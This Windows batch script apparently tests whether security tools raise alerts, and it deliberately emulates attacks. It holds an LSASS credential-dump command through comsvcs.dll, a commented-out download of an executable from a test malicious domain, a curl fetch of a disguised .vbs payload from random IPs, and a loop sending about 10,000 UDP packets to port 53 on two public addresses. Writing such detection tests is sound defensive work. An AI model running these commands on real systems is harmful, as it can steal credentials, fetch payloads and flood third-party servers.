@echo off
setlocal enabledelayedexpansion
echo.
::EDR
echo EDR: This will trigger an "LSASS Memory Dump via comsvcs" and "W32.ComsvcsDumpedMemory.ioc" EDR alert by attempting to dump Lsass memory into a file called lsass.dmp, however the Lsass PID is not included so the attempt will fail.
echo.
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full
echo.
::NVM
echo NVM: This trigger will download a picture from Cisco from Cisco into memory, and then remove it using a variable.
powershell -command "Invoke-WebRequest -Uri 'https://www.cisco.com/content/dam/cisco-cdc/site/images/heroes/homepage/2025/nvidia-cisco-ai-2400x1028.jpg' -Outfile \"$env:TEMP\Wallpaper.jpg\"; Remove-Item \"$env:TEMP\Wallpaper.jpg\""
::UMBRELLA
::echo.
::echo.
::echo.
::powershell -c "(new-object System.Net.WebClient).DownloadFile('http://internetbadguys.com/wget.exe','C:\temp\wget.exe')"
::echo.
::FIREWALL
echo.
echo Firewall: This command will Trigger a Firewall alert by requesting vbs script from a random IP using CURL. It is expected this attempt will fail. Please wait.
echo.
echo It is expected this attempt will fail. Please wait.
set /a x1=(%RANDOM% %% 256)
set /a x2=(%RANDOM% %% 256)
set /a x3=(%RANDOM% %% 256)
set /a x4=(%RANDOM% %% 256)
set "url=http://%x1%.%x2%.%x3%.%x4%/aN7jD0qO6kT5bK5bQ4eR8fE1xP7hL2vK/sqlite3.pdf.vbs"
@echo on
curl "%url%"
@echo off
::NDR
:: Batch file to emulate DNS abuse using PowerShell
echo.
echo To trigger network detection, this DNS Abuse emulation performs 1200 byte, slow, UDP Ping to IP 64.102.6.247, 10,000 times.
echo This is followed by the same technique to 64.102.6.247.
echo.
echo This will take some time.......
echo.
:: Task 1: Ping 75.75.75.75 UDP port 53
echo Starting Task 1: Pinging 75.75.75.75 UDP port 53...
powershell -Command "1..9999 | ForEach-Object { Write-Progress -Activity 'Pinging 75.75.75.75' -PercentComplete ($_/100); $udpClient = New-Object System.Net.Sockets.UdpClient('75.75.75.75', 53); $data = [System.Text.Encoding]::ASCII.GetBytes('A' * 1200); $udpClient.Send($data, $data.Length) | Out-Null; Start-Sleep -Milliseconds 25 }"
echo.
timeout /t 30
echo.
echo Starting Task 2: Pinging 64.102.6.247 UDP port 53...
powershell -Command "1..9999 | ForEach-Object { Write-Progress -Activity 'Pinging 64.102.6.247' -PercentComplete ($_/100); $udpClient = New-Object System.Net.Sockets.UdpClient('64.102.6.247', 53); $data = [System.Text.Encoding]::ASCII.GetBytes('A' * 1200); $udpClient.Send($data, $data.Length) | Out-Null; Start-Sleep -Milliseconds 25 }"
echo.
echo Network Emulation Tasks completed.
echo.
echo.
echo Failures were expected. All Tests Completed Successfully!
echo.
exit
